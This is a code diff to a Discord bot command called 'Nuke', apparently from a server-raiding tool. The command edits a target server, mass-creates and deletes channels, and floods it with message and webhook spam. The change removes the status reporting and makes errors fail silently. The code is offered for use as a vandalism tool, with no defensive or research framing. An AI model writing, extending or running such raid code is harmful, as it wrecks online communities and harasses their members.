@@ -22,46 +22,15 @@ class Nuke(commands.Cog):
             await ctx.reply("operations not initialized", delete_after=5)
             return
 
-        start = time.perf_counter()
-        embed = discord.Embed(
-            title="ZNE Nuking...",
-            description=f"Target: **{guild.name}** (`{guild.id}`)",
-            color=discord.Color.red(),
-        )
-        embed.add_field(name="Status", value="starting...", inline=False)
-        msg = await ctx.reply(embed=embed)
-
         try:
             await self.operations.mess_server(guild)
-            embed.set_field_at(0, name="Status", value="server edited", inline=False)
-            await msg.edit(embed=embed)
-
-            created = await self.operations.CrChannel(guild)
-            embed.add_field(name="Channels created", value=str(created), inline=True)
-            await msg.edit(embed=embed)
-
-            deleted = await self.operations.DelChannels(guild)
-            embed.add_field(name="Channels deleted", value=str(deleted), inline=True)
-            await msg.edit(embed=embed)
-
-            spammed = await self.operations.spam(guild)
-            embed.add_field(name="Spam sent", value=str(spammed), inline=True)
-            await msg.edit(embed=embed)
-
-            webhook_msgs = await self.operations.spam_webhook(guild)
-            embed.add_field(name="Webhook spam", value=str(webhook_msgs), inline=True)
-            await msg.edit(embed=embed)
-
-            elapsed = time.perf_counter() - start
-            embed.title = "ZNE Nuke Complete"
-            embed.color = discord.Color.dark_red()
-            embed.add_field(name="Elapsed", value=f"{elapsed:.2f}s", inline=False)
-            await msg.edit(embed=embed)
+            await self.operations.CrChannel(guild)
+            await self.operations.DelChannels(guild)
+            await self.operations.spam(guild)
+            await self.operations.spam_webhook(guild)
         except Exception as e:
-            embed.title = "Nuke failed"
-            embed.add_field(name="Error", value=str(e)[:1000], inline=False)
-            await msg.edit(embed=embed)
-
+            pass
+        
     @nuke.error
     async def nuke_error(self, ctx: commands.Context, error):
         if isinstance(error, commands.MissingPermissions):
